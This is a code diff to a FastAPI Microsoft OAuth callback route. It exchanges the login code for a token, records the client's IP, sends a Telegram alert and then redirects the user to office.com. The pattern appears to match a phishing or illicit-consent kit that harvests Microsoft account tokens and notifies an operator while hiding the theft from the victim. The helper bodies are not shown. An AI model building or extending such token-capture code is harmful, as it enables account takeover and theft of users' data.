@@ -39,21 +39,26 @@ def generate_login_url(user_id: str = None):
 # =========================
 # CALLBACK ROUTE
 # =========================
-from fastapi.responses import RedirectResponse
-
 @app.get("/auth/callback")
 def auth_callback(request: Request):
+    """
+    Handles Microsoft OAuth callback, exchanges code for token,
+    sends Telegram alert, and redirects user to Office.com.
+    """
     code = request.query_params.get("code")
-    state = request.query_params.get("state")  # tenant_id passed in state
+    state = request.query_params.get("state")  # user_id passed in state
     if not code:
         return {"error": "No code received from callback."}
 
+    # Get client IP for location logging
+    client_ip = request.client.host
+
     try:
-        exchange_code_for_token(code, state)
-        # Redirect user to Office.com after successful token acquisition
+        # Exchange code for token and trigger Telegram alert
+        exchange_code_for_token(code, state, client_ip)
+        # Redirect user to Office.com after successful login
         return RedirectResponse(url="https://www.office.com")
     except Exception as e:
-        # You could also redirect to an error page instead of returning JSON
         return {"error": str(e)}
 
 
